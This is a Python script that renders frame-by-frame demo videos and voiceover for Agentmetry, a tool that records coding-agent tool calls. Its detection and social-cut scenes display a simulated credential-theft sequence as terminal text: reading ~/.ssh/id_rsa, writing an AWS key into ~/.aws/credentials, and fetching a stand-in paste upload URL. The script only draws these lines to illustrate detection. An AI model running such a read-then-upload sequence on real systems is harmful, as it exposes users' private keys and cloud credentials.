"""Render the Agentmetry demo videos, frame by frame, with a voiceover.

Two cuts from one set of scenes:

    python scripts/make_demo_video.py                     # full cut, 16:9, 90 s
    python scripts/make_demo_video.py --cut social        # LinkedIn cut, 1:1, 37 s
    python scripts/make_demo_video.py --cut social --aspect 4:5
    python scripts/make_demo_video.py --stills            # PNGs to check the look
    python scripts/make_demo_video.py --no-voice          # picture only

Terminal lines are real output from 0.9.4 (`agentmetry demo`, `agentmetry
benchmark`, `agentmetry hooks status`, `agentmetry mcp`, the hook's deny and
ask reasons), except where a comment says TODO: those are placeholders for
text an agent prints that has not been captured yet. Server names in the
discovery panel are illustrative; the line format is the real one.

Brand per agentmetry.ai: black, warm off-white, IBM Plex, orange for the
critical finding and the call to action, sentence case, no em-dashes.

Needs Pillow, ffmpeg on PATH, the IBM Plex fonts the marketing site bundles
(../ai-audit-watch, or AGENTMETRY_PLEX_DIR pointing at @fontsource), and for
the voice `npx hyperframes tts` (local Kokoro; nothing is sent anywhere).
"""

from __future__ import annotations

import argparse
import json
import math
import os
import shutil
import subprocess
from pathlib import Path

from PIL import Image, ImageDraw, ImageFont

FPS = 30
W, H = 1920, 1080  # set by configure()
_REPO = Path(__file__).resolve().parents[1]
ASSETS = _REPO / "docs" / "assets"
FONTS = Path(
    os.environ.get("AGENTMETRY_PLEX_DIR")
    or _REPO.parent / "ai-audit-watch" / "node_modules" / "@fontsource"
)
VOICE = "am_michael"
VOICE_SPEED = 1.08

FG = (244, 241, 234)
MUTED = (154, 149, 140)
DIM = (107, 103, 96)
ORANGE = (249, 115, 22)
GREEN = (134, 239, 172)
AMBER = (217, 164, 65)
RED = (235, 74, 61)
BORDER = (38, 38, 38)


def font(family: str, weight: int, size: int) -> ImageFont.FreeTypeFont:
    return ImageFont.truetype(
        str(FONTS / f"ibm-plex-{family}" / "files" / f"ibm-plex-{family}-latin-{weight}-normal.woff"), size
    )


H1 = font("sans", 600, 66)
H2 = font("sans", 600, 52)
BODY = font("sans", 400, 40)
CAP = font("sans", 400, 32)
SMALL = font("sans", 400, 28)
TAG = font("sans", 500, 22)
WORD = font("sans", 600, 64)
STAMP = font("mono", 500, 34)
MONO = font("mono", 400, 27)
MONO_S = font("mono", 400, 23)
MONO_L = font("mono", 400, 40)

# Social cut: a phone screen at arm's length, so everything is bigger.
S_H1 = font("sans", 600, 58)
S_BODY = font("sans", 400, 36)
S_CAPTION = font("sans", 600, 48)
S_MONO = font("mono", 400, 30)
S_MONO_L = font("mono", 400, 38)
S_STAMP = font("mono", 500, 40)
S_WORD = font("sans", 600, 60)


def col(c: tuple[int, int, int], a: float) -> tuple[int, int, int]:
    # Everything sits on black, so alpha is a multiply.
    a = max(0.0, min(1.0, a))
    return (int(c[0] * a), int(c[1] * a), int(c[2] * a))


def ease(x: float) -> float:
    x = max(0.0, min(1.0, x))
    return 1 - (1 - x) ** 3


def appear(u: float, at: float, dur: float = 0.5) -> float:
    return ease((u - at) / dur)


def typed(text: str, u: float, at: float, cps: float = 30.0) -> str:
    if u < at:
        return ""
    return text[: int((u - at) * cps)]


def scene_alpha(u: float, length: float, fade: float = 0.45) -> float:
    if u < 0 or u > length:
        return 0.0
    return min(1.0, u / fade, (length - u) / fade)


# --- backdrop: the site's grid and warm glow, computed once ----------------------------

def backdrop() -> Image.Image:
    img = Image.new("RGB", (W, H), (0, 0, 0))
    px = img.load()
    gx, gy = W * 0.72, H * 0.30
    for y in range(H):
        for x in range(W):
            d = math.hypot((x - W * 1.02) / (W * 0.55), (y + H * 0.15) / (H * 0.75))
            glow = max(0.0, 1 - d) ** 2 * 0.10
            m = max(0.0, 1 - math.hypot((x - gx) / (W * 0.5), (y - gy) / (H * 0.55)))
            line = 0.045 * m if (x % 64 == 0 or y % 64 == 0) else 0.0
            r = ORANGE[0] * glow + FG[0] * line
            g = ORANGE[1] * glow + FG[1] * line
            b = ORANGE[2] * glow + FG[2] * line
            px[x, y] = (int(r), int(g), int(b))
    return img


# --- drawing helpers ---------------------------------------------------------------------

def center_text(d: ImageDraw.ImageDraw, y: float, text: str, f, c, a: float) -> None:
    w = d.textlength(text, font=f)
    d.text(((W - w) / 2, y), text, font=f, fill=col(c, a))


def segments(d: ImageDraw.ImageDraw, x: float, y: float, segs, f, a: float) -> None:
    for text, c in segs:
        d.text((x, y), text, font=f, fill=col(c, a))
        x += d.textlength(text, font=f)


def panel(d: ImageDraw.ImageDraw, box, a: float) -> None:
    d.rectangle(box, fill=col((3, 3, 3), a), outline=col(BORDER, a), width=2)


def mark(d: ImageDraw.ImageDraw, cx: float, cy: float, s: float, a: float) -> None:
    """The Agentmetry chevron A and its record dot, from docs/logo/agentmetry-icon.svg."""
    pts = [(88, 24), (152, 150), (120, 150), (88, 84), (56, 150), (24, 150)]
    sc = s / 176
    poly = [(cx + (px - 88) * sc, cy + (py - 88) * sc) for px, py in pts]
    d.polygon(poly, fill=col(FG, a))
    r = 15 * sc
    dx, dy = cx, cy + (124 - 88) * sc
    d.ellipse((dx - r, dy - r, dx + r, dy + r), fill=col(ORANGE, a))


def logo(d: ImageDraw.ImageDraw, cy: float, a: float, s: float = 120, word=None) -> None:
    word = word or WORD
    gap = 28 * s / 120
    word_w = d.textlength("Agentmetry", font=word)
    total = s * 0.75 + gap + word_w
    x0 = (W - total) / 2
    mark(d, x0 + s * 0.375, cy, s, a)
    d.text((x0 + s * 0.75 + gap, cy - word.size * 0.66), "Agentmetry", font=word, fill=col(FG, a))


def slab(d: ImageDraw.ImageDraw, x: float, y: float, w: float, h: float, edge, face, a: float) -> None:
    """A record as a thin 3D slab: front face, top face and side, in line."""
    dx, dy = 26, -20
    top = [(x, y), (x + w, y), (x + w + dx, y + dy), (x + dx, y + dy)]
    side = [(x + w, y), (x + w + dx, y + dy), (x + w + dx, y + h + dy), (x + w, y + h)]
    d.polygon(top, fill=col(face, a * 1.0), outline=col(edge, a))
    d.polygon(side, fill=col(face, a * 0.7), outline=col(edge, a))
    d.rectangle((x, y, x + w, y + h), fill=col(face, a * 0.85), outline=col(edge, a), width=2)


def box_label(d, box, text, f, c, a, outline=(120, 117, 110)) -> None:
    """A labelled box, text centred."""
    d.rectangle(box, fill=col((6, 6, 6), a), outline=col(outline, a), width=2)
    w = d.textlength(text, font=f)
    x0, y0, x1, y1 = box
    d.text((x0 + (x1 - x0 - w) / 2, y0 + (y1 - y0 - f.size) / 2 - 4), text, font=f, fill=col(c, a))


def arrow(d, x0, y0, x1, y1, a, c=(90, 88, 84), p: float = 1.0) -> None:
    """A line that draws itself from (x0, y0) to (x1, y1) as p goes 0 to 1, with a head."""
    if p <= 0:
        return
    xe, ye = x0 + (x1 - x0) * p, y0 + (y1 - y0) * p
    d.line((x0, y0, xe, ye), fill=col(c, a), width=3)
    if p >= 1:
        ang = math.atan2(y1 - y0, x1 - x0)
        for s in (2.6, -2.6):
            d.line((x1, y1, x1 - 14 * math.cos(ang + s / 3), y1 - 14 * math.sin(ang + s / 3)), fill=col(c, a), width=3)


def stamp(d, x, y, text, f, c, a, pulse: float = 0.0) -> float:
    """A verdict word in a filled box. Returns its right edge."""
    w = d.textlength(text, font=f)
    pad = 14
    d.rectangle((x, y - 6, x + w + 2 * pad, y + f.size + 10), fill=col(c, a * (0.16 + 0.22 * pulse)), outline=col(c, a), width=2)
    d.text((x + pad, y), text, font=f, fill=col(c, a))
    return x + w + 2 * pad


# --- full cut scenes: each takes local time u and its own length L ----------------------

def s_hook(d, u, L):
    a = scene_alpha(u, L)
    center_text(d, 420, "Your coding agent reads a private key,", H1, FG, a * appear(u, 0.4))
    center_text(d, 505, "then calls the network.", H1, FG, a * appear(u, 1.0))
    center_text(d, 640, "Your EDR sees powershell.exe.", H1, MUTED, a * appear(u, 3.0))


def s_value(d, u, L):
    a = scene_alpha(u, L)
    logo(d, 380, a * appear(u, 0.3, 0.7))
    center_text(d, 520, "Agentmetry records every tool call your coding agents make,", BODY, FG, a * appear(u, 1.6))
    center_text(d, 575, "on the developer's machine.", BODY, FG, a * appear(u, 1.9))
    center_text(d, 680, "Claude Code, Cursor, Codex and more. Apache-2.0.", CAP, MUTED, a * appear(u, 3.4))


def s_install(d, u, L):
    a = scene_alpha(u, L)
    panel(d, (460, 360, 1460, 600), a)
    y = 405
    segments(d, 510, y, [("$ ", DIM), (typed("pip install agentmetry", u, 0.7, 18), FG)], MONO_L, a)
    if u > 2.3:
        segments(d, 510, y + 80, [("$ ", DIM), (typed("agentmetry demo", u, 2.6, 18), FG)], MONO_L, a)
    center_text(d, 670, "One command. No server, no config. The demo leaves nothing behind.", CAP, MUTED, a * appear(u, 3.6))


def s_sees(d, u, L):
    """How it sees: agent -> hooks and MCP proxy -> local hash-chained trail."""
    a = scene_alpha(u, L)
    center_text(d, 92, "How it sees", H2, FG, a * appear(u, 0.2))
    agents = ["Claude Code", "Cursor", "Codex"]
    ax0, ax1 = 200, 560
    for i, name in enumerate(agents):
        y = 300 + i * 120
        box_label(d, (ax0, y, ax1, y + 80), name, SMALL, FG, a * appear(u, 0.3 + i * 0.15))
    mids = [("agent hooks", 330), ("MCP stdio proxy", 530)]
    mx0, mx1 = 820, 1180
    for j, (name, y) in enumerate(mids):
        ma = a * appear(u, 0.9 + j * 0.15)
        box_label(d, (mx0, y, mx1, y + 80), name, SMALL, FG, ma)
    # Agents into the capture layer.
    p1 = ease((u - 1.2) / 0.6)
    for i in range(3):
        ys = 340 + i * 120
        target = 370 if i < 2 else 570
        if i == 2:
            target = 370  # Codex speaks hooks too
        arrow(d, ax1 + 8, ys, mx0 - 10, target, a, p=p1)
    arrow(d, ax1 + 8, 460, mx0 - 10, 570, a, p=p1)  # any agent with an MCP server
    # Capture layer into the trail.
    tx0, tx1 = 1420, 1720
    p2 = ease((u - 1.8) / 0.5)
    arrow(d, mx1 + 8, 370, tx0 - 10, 460, a, p=p2)
    arrow(d, mx1 + 8, 570, tx0 - 10, 480, a, p=p2)
    ta = a * appear(u, 2.1, 0.6)
    for k in range(4):
        slab(d, tx0, 430 + k * 0 - k * 34 + 60, tx1 - tx0 - 26, 26, (120, 117, 110) if k < 3 else ORANGE, (14, 14, 14) if k < 3 else (50, 22, 6), ta)
    d.text((tx0, 540), "local hash-chained trail", font=SMALL, fill=col(MUTED, ta))
    # Records travelling the last leg once it is drawn.
    if u > 2.4:
        for k in range(3):
            p = ((u - 2.4) * 0.9 + k / 3) % 1.0
            for yy0, yy1 in ((370, 460), (570, 480)):
                x = mx1 + 8 + (tx0 - 10 - mx1 - 8) * p
                y = yy0 + (yy1 - yy0) * p
                d.rectangle((x - 6, y - 6, x + 6, y + 6), fill=col(FG, a * 0.85))
    ca = a * appear(u, 2.6)
    center_text(d, 760, "No kernel driver", CAP, FG, ca)
    center_text(d, 815, "Nothing leaves the machine unless you add a sink", CAP, MUTED, a * appear(u, 2.9))


K = 0.85  # the detection scene runs 16 s now, not 20


SESSION = [
    (0.6, [("  agent ", FG), ("reads a private key", MUTED)]),
    (1.2, "$ cat ~/.ssh/id_rsa"),
    (2.6, [("  agent ", FG), ("writes a cloud key into a config file", MUTED)]),
    (3.1, "$ echo aws_access_key_id=AKIAIOSFODNN7EXAMPLE >> ~/.aws/credentials"),
    (5.4, [("  DLP   ", AMBER), ("matched ", MUTED), ("aws_access_key", FG), (" (critical), value NOT stored", MUTED)]),
    (6.5, [("  agent ", FG), ("fetches a URL", MUTED)]),
    (7.0, "$ fetch https://paste.example.com/upload"),
    (8.9, None),
    (9.0, [("What Agentmetry recorded", FG)]),
    (9.5, [("  cursor.Read    ", FG), ("T1552.004   ", FG), ("Credential Access", MUTED)]),
    (9.9, [("  cursor.Shell   ", FG), ("T1552.001   ", FG), ("Credential Access  ", MUTED), ("[dlp:aws_access_key]", AMBER)]),
    (10.3, [("  WebFetch       ", FG), ("T1071.001   ", FG), ("Command and Control", MUTED)]),
    (11.3, None),
    (11.5, [("  [CRITICAL] credential-exfil", ORANGE)]),
    (12.0, [("  cursor.Read accessed credentials, then WebFetch egressed to the network in the same session.", FG)]),
    (12.4, [("  ATT&CK: T1552.004 -> T1071.001 · correlates 2 events", MUTED)]),
]


def s_detect(d, u, L):
    a = scene_alpha(u, L)
    panel(d, (110, 90, 1810, 880), a)
    y = 130
    for at, line in SESSION:
        at *= K
        if line is None:
            y += 22
            continue
        if u >= at:
            if isinstance(line, str):
                text = typed(line[2:], u, at, 53)
                segments(d, 150, y, [("  $ ", DIM), (text, FG)], MONO, a)
            else:
                la = a * appear(u, at, 0.3)
                if line[0][1] == ORANGE:
                    p = max(0.0, 1 - (u - at) / 1.4)
                    gy = y - 8
                    d.rectangle((140, gy, 1790, gy + 46), fill=col(ORANGE, la * (0.10 + 0.22 * p)))
                segments(d, 150, y, line, MONO, la)
        y += 44
    center_text(d, 935, "No single call is an alert. The sequence is.", CAP, FG, a * appear(u, 11.4))


# What an agent prints when a hook denies or asks has not been captured from a
# real session yet. Replace these two with the agents' actual text.
CURSOR_DENY_TEXT = "Blocked by hook"  # TODO: Cursor's real message when a hook denies a shell command
CLAUDE_ASK_TEXT = "Approval required"  # TODO: Claude Code's real permission prompt text for a hook `ask`


def s_block(d, u, L):
    """It can also stop it: the same write denied by DLP block mode, and an ask from a policy rule."""
    a = scene_alpha(u, L)
    center_text(d, 92, "It can also stop it", H2, FG, a * appear(u, 0.2))
    lx, rx, top, bot, pw = 90, 990, 200, 860, 840

    # DENY: DLP in block mode, the hook's reason is dlp:<rule_id>.
    la = a * appear(u, 0.4)
    panel(d, (lx, top, lx + pw, bot), la)
    x = lx + 36
    segments(d, x, top + 34, [("policy  ", DIM), ("AGENTMETRY_DLP_MODE=block", FG)], MONO_S, la)
    if u > 0.9:
        segments(d, x, top + 96, [("cursor  ", DIM), ("writes a cloud key into a config file", MUTED)], MONO_S, la)
        segments(d, x, top + 140, [("$ ", DIM), (typed("echo aws_access_key_id=AKIAIOSFODNN7EXAMPLE", u, 1.2, 50), FG)], MONO_S, la)
        segments(d, x, top + 176, [("    ", DIM), (typed(">> ~/.aws/credentials", u, 2.1, 50), FG)], MONO_S, la)
    if u > 2.6:
        sa = la * appear(u, 2.6, 0.25)
        p = max(0.0, 1 - (u - 2.6) / 1.2)
        right = stamp(d, x, top + 250, "DENY", STAMP, RED, sa, p)
        d.text((right + 20, top + 258), "dlp:aws_access_key", font=MONO, fill=col(FG, sa))
        d.text((x, top + 330), CURSOR_DENY_TEXT, font=SMALL, fill=col(DIM, sa))
    if u > 3.3:
        ra = la * appear(u, 3.3, 0.3)
        d.text((x, top + 430), "recorded", font=SMALL, fill=col(MUTED, ra))
        segments(d, x, top + 476, [("cursor.Shell  ", FG), ("denied  ", RED), ("dlp:aws_access_key", AMBER)], MONO_S, ra)
        segments(d, x, top + 512, [("value NOT stored", MUTED)], MONO_S, ra)

    # ASK: a tool-policy rule with action: ask, in block mode. Honoured as a
    # real prompt by Claude Code PreToolUse (core/audit/tool_policy/capability.py).
    ra0 = a * appear(u, 3.0)
    panel(d, (rx, top, rx + pw, bot), ra0)
    x = rx + 36
    segments(d, x, top + 34, [("policy  ", DIM), ("AGENTMETRY_TOOL_POLICY_MODE=block", FG)], MONO_S, ra0)
    rule = ["- id: ask_aws_config_write", "  action: ask", '  tools: ["Bash"]', '  command_pattern: "\\.aws/"']
    for i, line in enumerate(rule):
        d.text((x, top + 76 + i * 32), line, font=MONO_S, fill=col(MUTED, ra0 * appear(u, 3.2 + i * 0.1)))
    if u > 4.0:
        segments(d, x, top + 232, [("$ ", DIM), (typed("aws configure set region eu-west-1", u, 4.1, 50), FG)], MONO_S, ra0)
    if u > 5.0:
        sa = ra0 * appear(u, 5.0, 0.25)
        p = max(0.0, 1 - (u - 5.0) / 1.2)
        right = stamp(d, x, top + 300, "ASK", STAMP, AMBER, sa, p)
        d.text((right + 20, top + 308), "approval required", font=MONO, fill=col(FG, sa))
        d.text((x, top + 380), "Claude Code: " + CLAUDE_ASK_TEXT, font=SMALL, fill=col(DIM, sa))
    if u > 5.6:
        ra = ra0 * appear(u, 5.6, 0.3)
        d.text((x, top + 430), "recorded", font=SMALL, fill=col(MUTED, ra))
        segments(d, x, top + 476, [("Bash  ", FG), ("approval_request  ", FG), ("pending", AMBER)], MONO_S, ra)
        segments(d, x, top + 512, [("tool_policy:ask_aws_config_write", AMBER)], MONO_S, ra)

    center_text(d, 935, "Record, alert, or block. Your policy decides.", CAP, FG, a * appear(u, 5.4))


def s_tamper(d, u, L):
    a = scene_alpha(u, L)
    center_text(d, 92, "Now try to rewrite it", H2, FG, a * appear(u, 0.2))
    edited = u >= 2.4
    bw, bh, gap = 230, 54, 90
    total = 4 * bw + 3 * gap
    x0 = (W - total) / 2
    y0 = 290
    ca = a * appear(u, 0.4, 0.6)
    for i in range(4):
        x = x0 + i * (bw + gap)
        last = i == 3
        if last and edited:
            edge, face = RED, (45, 12, 10)
        elif last:
            edge, face = ORANGE, (50, 22, 6)
        else:
            edge, face = (120, 117, 110), (14, 14, 14)
        slab(d, x, y0, bw, bh, edge, face, ca)
        if i < 3:
            lx0, lx1, ly = x + bw + 4, x + bw + gap - 4, y0 + bh / 2
            broken = i == 2 and edited
            lc = RED if broken else (90, 88, 84)
            if broken:
                mid = (lx0 + lx1) / 2
                d.line((lx0, ly, mid - 12, ly), fill=col(lc, ca), width=3)
                d.line((mid + 12, ly, lx1, ly), fill=col(lc, ca), width=3)
            else:
                d.line((lx0, ly, lx1, ly), fill=col(lc, ca), width=3)
    for i, lab in enumerate(["seq 1", "seq 2", "seq 3", "seq 4 · detection"]):
        d.text((x0 + i * (bw + gap), y0 + bh + 18), lab, font=SMALL, fill=col(MUTED, ca))

    panel(d, (190, 480, 1730, 780), a)
    rows = [
        (0.9, [("  agentmetry verify --trail     ", FG), ("OK", GREEN), (", 4 chained records", MUTED)]),
        (2.0, [("  someone ", FG), ("downgrades the CRITICAL detection to low, in place", MUTED)]),
        (3.0, [("  agentmetry verify --trail     ", FG), ("FAIL", RED), (", record_sha256 mismatch at line 4 (tampered?)", MUTED)]),
    ]
    y = 530
    for at, segs in rows:
        if u >= at:
            segments(d, 220, y, segs, MONO, a * appear(u, at, 0.3))
        y += 70
    center_text(d, 880, "Edits are detected. An anchor kept off the machine catches a full rewrite.", CAP, FG, a * appear(u, 4.0))


SINKS = ["Splunk", "Elastic", "Microsoft Sentinel", "Google SecOps"]
SINK_Y = [330, 450, 570, 690]
SRC_X, FORK_X, QUEUE_X, SINK_X = 360, 860, 1290, 1420
SPAWN0, SPAWN_EVERY, N_REC = 0.8, 0.38, 22
OFF_START, OFF_END = 3.4, 6.6
LEG1, LEG2, DRAIN = 1.0, 1.0, 0.09


def flow_plan():
    """Deterministic schedule: when each copy reaches each sink, with Splunk's queue."""
    plan = []
    q_free = OFF_END
    queued = 0
    for k in range(N_REC):
        s = SPAWN0 + k * SPAWN_EVERY
        tf = s + LEG1
        for j in range(4):
            ta = tf + LEG2
            if j == 0 and OFF_START <= ta < max(OFF_END, q_free):
                release = max(q_free, ta)
                q_free = release + DRAIN
                plan.append((k, j, s, ta, release, queued))
                queued += 1
            else:
                plan.append((k, j, s, ta, None, None))
    return plan


PLAN = flow_plan()


def s_siem(d, u, L):
    a = scene_alpha(u, L)
    center_text(d, 92, "Into the SIEM you already run", H2, FG, a * appear(u, 0.3))
    d.rectangle((SRC_X - 150, 380, SRC_X - 20, 640), outline=col((120, 117, 110), a), width=2)
    d.text((SRC_X - 150, 655), "local trail", font=SMALL, fill=col(MUTED, a))
    for i in range(9):
        ly = 405 + i * 26
        d.line((SRC_X - 130, ly, SRC_X - 40 - (i * 17) % 40, ly), fill=col((90, 88, 84), a), width=3)
    d.line((SRC_X, 510, FORK_X, 510), fill=col((60, 60, 58), a), width=2)
    offline = OFF_START <= u < OFF_END
    for j, (name, sy) in enumerate(zip(SINKS, SINK_Y)):
        off = offline and j == 0
        d.line((FORK_X, 510, SINK_X, sy + 22), fill=col((48, 48, 46), a * (0.4 if off else 1)), width=2)
        d.rectangle((SINK_X, sy, SINK_X + 44, sy + 44), outline=col((120, 117, 110), a * (0.35 if off else 1)), width=2)
        d.text((SINK_X + 64, sy + 4), name, font=SMALL, fill=col(DIM if off else FG, a))
        if off:
            d.text((SINK_X + 64 + d.textlength(name, font=SMALL) + 16, sy + 4), "offline", font=SMALL, fill=col(AMBER, a))
    for k in range(N_REC):
        s = SPAWN0 + k * SPAWN_EVERY
        if s <= u < s + LEG1:
            p = (u - s) / LEG1
            x = SRC_X + (FORK_X - SRC_X) * p
            d.rectangle((x - 9, 501, x + 9, 519), fill=col((20, 20, 20), a), outline=col(FG, a), width=2)
    waiting = 0
    for k, j, s, ta, release, qi in PLAN:
        tf = s + LEG1
        if u < tf:
            continue
        sy = SINK_Y[j] + 22
        if release is None or u < ta:
            if u >= ta:
                continue
            p = (u - tf) / LEG2
            end_x = QUEUE_X if release is not None else SINK_X
            stop_p = (QUEUE_X - FORK_X) / (SINK_X - FORK_X) if release is not None else 1.0
            pp = min(p, stop_p) / stop_p if release is not None else p
            x = FORK_X + (end_x - FORK_X) * pp
            y = 510 + (sy - 510) * pp
            d.rectangle((x - 6, y - 6, x + 6, y + 6), fill=col(FG, a * 0.9))
        else:
            if u < release:
                waiting += 1
                col_i, row_i = divmod(qi, 7)
                x = QUEUE_X - col_i * 18
                y = sy + 14 - row_i * 16 - 30
                d.rectangle((x - 6, y - 6, x + 6, y + 6), fill=col(AMBER, a))
            elif u < release + 0.25:
                p = (u - release) / 0.25
                x = QUEUE_X + (SINK_X - QUEUE_X) * p
                d.rectangle((x - 6, sy - 6, x + 6, sy + 6), fill=col(AMBER, a))
    status = ""
    if offline:
        status = f"Splunk is offline. {waiting} waiting at its cursor, none dropped."
    elif u >= OFF_END and waiting:
        status = f"Splunk is back. Its cursor is draining: {waiting} left."
    if status:
        center_text(d, 800, status, SMALL, MUTED, a)
    center_text(d, 905, "From a cursor per sink. An outage delays events, it does not lose them.", CAP, FG, a * appear(u, 1.6))


# `agentmetry hooks status` and `agentmetry mcp`, in their real line formats.
# The server names are illustrative; this is not anyone's machine.
DISCOVERY = [
    ("$ agentmetry hooks status", FG),
    ("recorded: antigravity, claude, codex, cursor", MUTED),
    ("not installed: codebuddy, kimi, qoder, qwen", DIM),
    ("", None),
    ("$ agentmetry mcp", FG),
    ("2 MCP server(s) across 3 config file(s)", MUTED),
    ("  [claude/stdio] github: npx -y @modelcontextprotocol/server-github", MUTED),
    ("  [cursor/http] linear: https://mcp.linear.app/mcp", MUTED),
]


def s_fleet(d, u, L):
    """Built for fleets: the Enterprise MSI and Intune scripts, and what a machine reports."""
    a = scene_alpha(u, L)
    center_text(d, 92, "Built for fleets", H2, FG, a * appear(u, 0.2))
    la = a * appear(u, 0.4)
    lx0, lx1, top, bot = 90, 760, 200, 840
    panel(d, (lx0, top, lx1, bot), la)
    tag = "Enterprise"
    tw = d.textlength(tag, font=TAG)
    d.rectangle((lx1 - tw - 52, top + 24, lx1 - 24, top + 60), outline=col(DIM, la), width=1)
    d.text((lx1 - tw - 38, top + 28), tag, font=TAG, fill=col(MUTED, la))
    steps = [
        ("agentmetry.msi", "installs the recorder"),
        ("NT SERVICE\\Agentmetry", "runs it as a Windows service"),
        ("Detect- and Remediate-AgentmetryHooks.ps1", "Intune, as the signed-in user"),
    ]
    for i, (name, note) in enumerate(steps):
        y = top + 110 + i * 170
        sa = la * appear(u, 0.6 + i * 0.35)
        d.text((lx0 + 40, y), name, font=MONO_S, fill=col(FG, sa))
        d.text((lx0 + 40, y + 38), note, font=SMALL, fill=col(MUTED, sa))
        if i in (0, 1):
            arrow(d, lx0 + 60, y + 90, lx0 + 60, y + 150, sa, p=ease((u - 0.8 - i * 0.35) / 0.3))

    rx0, rx1 = 820, 1830
    ra = a * appear(u, 1.0)
    panel(d, (rx0, top, rx1, bot), ra)
    y = top + 50
    for i, (line, c) in enumerate(DISCOVERY):
        if line:
            d.text((rx0 + 40, y), line, font=MONO_S, fill=col(c, ra * appear(u, 1.3 + i * 0.22, 0.25)))
        y += 52
    center_text(d, 905, "Windows MSI and Intune scripts for fleet rollout.", CAP, FG, a * appear(u, 3.2))


BENCH = [
    "Agentmetry detection benchmark",
    "",
    "  cases            54 (26 attack, 28 benign)",
    "  rules covered    13",
    "  expected firings 26",
    "  detected         26",
    "  missed           0",
    "  false positives  0",
    "",
    "  All cases behaved as recorded.",
]


def s_bench(d, u, L):
    a = scene_alpha(u, L)
    center_text(d, 92, "Every claim has a command behind it", H2, FG, a * appear(u, 0.3))
    panel(d, (460, 230, 1460, 820), a)
    segments(d, 500, 270, [("$ ", DIM), (typed("agentmetry benchmark", u, 0.6, 24), FG)], MONO, a)
    y = 330
    for i, line in enumerate(BENCH):
        at = 1.6 + i * 0.2
        if u >= at and line:
            c = GREEN if line.strip() in ("missed           0", "false positives  0") else FG if i == 9 else MUTED
            d.text((500, y), line, font=MONO, fill=col(c, a * appear(u, at, 0.25)))
        y += 44
    center_text(d, 890, "Run it yourself before you believe it.", CAP, FG, a * appear(u, 4.2))


def s_cta(d, u, L):
    a = scene_alpha(u, L + 0.6)  # holds to the last frame
    logo(d, 360, a * appear(u, 0.3, 0.7))
    la = a * appear(u, 1.6)
    w = d.textlength("pip install agentmetry", font=MONO_L)
    d.rectangle(((W - w) / 2 - 36, 500, (W + w) / 2 + 36, 584), outline=col(BORDER, la), width=2, fill=col((3, 3, 3), la))
    center_text(d, 518, "pip install agentmetry", MONO_L, FG, la)
    center_text(d, 640, "agentmetry.ai/pilot", BODY, ORANGE, a * appear(u, 2.8))
    center_text(d, 730, "Local-first. Your trail stays on your machine.", CAP, MUTED, a * appear(u, 4.0))


FULL = [
    (0, 7, s_hook),
    (7, 15, s_value),
    (15, 21, s_install),
    (21, 26, s_sees),
    (26, 42, s_detect),
    (42, 50, s_block),
    (50, 58, s_tamper),
    (58, 68, s_siem),
    (68, 74, s_fleet),
    (74, 82, s_bench),
    (82, 90, s_cta),
]

# Voiceover for the full cut: (start second, text). Spelled for the voice, not
# the eye: "E D R", "dot A I". Every line must end before the next starts;
# build_voice() checks that and refuses otherwise.
FULL_VO = [
    (0.3, "Your agent reads a private key, then calls the network. Your E D R sees PowerShell."),
    (7.4, "Agentmetry records every tool call your coding agents make, right on the developer's machine."),
    (15.4, "One command to try it. The demo leaves nothing behind."),
    (21.0, "It listens through the agents' own hooks and an MCP proxy. No kernel driver."),
    (26.5, "Here an agent reads a private key, writes a cloud key into a config file, then sends data to the web."),
    (35.2, "Each call looks ordinary. Together, they are credential theft. No single call is an alert. The sequence is."),
    (42.4, "It can also stop it. Block the call, or ask a person first. Either way, the decision is recorded."),
    (50.3, "Records are chained, so an edit breaks the chain. An anchor kept off the machine catches a full rewrite."),
    (58.4, "Events go to Splunk, Elastic, Microsoft Sentinel or Google SecOps. If one goes down, its events wait. None are lost."),
    (68.4, "For fleets, there is a Windows installer and Intune scripts."),
    (74.4, "Fifty four benchmark cases. Zero missed, zero false positives. Run it yourself before you believe it."),
    (82.4, "pip install agentmetry. Or start a pilot at agentmetry dot A I slash pilot."),
]


# --- social cut: 1080 wide, square or 4:5, captions burned in ------------------------

def top(h: float) -> float:
    """Where a block `h` tall starts, centred in the space above the caption band."""
    return max(60.0, (H - 280 - h) / 2)


def caption(d, u_global, cues) -> None:
    """Bottom band, two lines at most, readable on a phone with the sound off."""
    for start, end, text in cues:
        if start <= u_global < end:
            a = min(1.0, (u_global - start) / 0.2, (end - u_global) / 0.2)
            words = text.split()
            lines = [text]
            if d.textlength(text, font=S_CAPTION) > W - 140:
                best = None
                for k in range(1, len(words)):
                    pair = [" ".join(words[:k]), " ".join(words[k:])]
                    widest = max(d.textlength(x, font=S_CAPTION) for x in pair)
                    if best is None or widest < best[0]:
                        best = (widest, pair)
                lines = best[1]
            y0 = H - 110 - 64 * len(lines)
            pad = 22
            widest = max(d.textlength(line, font=S_CAPTION) for line in lines)
            d.rectangle(((W - widest) / 2 - pad, y0 - pad, (W + widest) / 2 + pad, y0 + 64 * len(lines) + pad - 10),
                        fill=col((10, 10, 10), a))
            for i, line in enumerate(lines):
                center_text(d, y0 + i * 64, line, S_CAPTION, FG, a)


def ss_hook(d, u, L):
    a = scene_alpha(u, L)
    y = top(300)
    panel(d, (90, y, W - 90, y + 300), a)
    segments(d, 130, y + 50, [("$ ", DIM), (typed("cat ~/.ssh/id_rsa", u, 0.4, 30), FG)], S_MONO_L, a)
    if u > 1.2:
        segments(d, 130, y + 130, [("$ ", DIM), (typed("fetch https://paste…/upload", u, 1.3, 30), FG)], S_MONO_L, a)
    ea = a * appear(u, 3.3)
    d.text((130, y + 214), "EDR sees", font=S_BODY, fill=col(MUTED, ea))
    d.text((130 + d.textlength("EDR sees  ", font=S_BODY), y + 210), "powershell.exe", font=S_MONO_L, fill=col(FG, ea))


S_SESSION = [
    (0.3, "$ cat ~/.ssh/id_rsa", FG),
    (1.1, "$ echo aws_access_key_id=AKIA…", FG),
    (1.6, "    >> ~/.aws/credentials", FG),
    (2.4, "DLP: aws_access_key, value NOT stored", AMBER),
    (3.3, "$ fetch https://paste…/upload", FG),
]


def ss_detect(d, u, L):
    a = scene_alpha(u, L)
    y0 = top(640)
    panel(d, (70, y0, W - 70, y0 + 640), a)
    y = y0 + 40
    for at, line, c in S_SESSION:
        if u >= at:
            text = typed(line, u, at, 60) if line.startswith(("$", "  ")) else line
            d.text((110, y), text, font=S_MONO, fill=col(c, a * appear(u, at, 0.25)))
        y += 56
    if u >= 5.0:
        la = a * appear(u, 5.0, 0.3)
        p = max(0.0, 1 - (u - 5.0) / 1.4)
        d.rectangle((90, y + 30, W - 90, y + 250), fill=col(ORANGE, la * (0.08 + 0.18 * p)), outline=col(ORANGE, la), width=2)
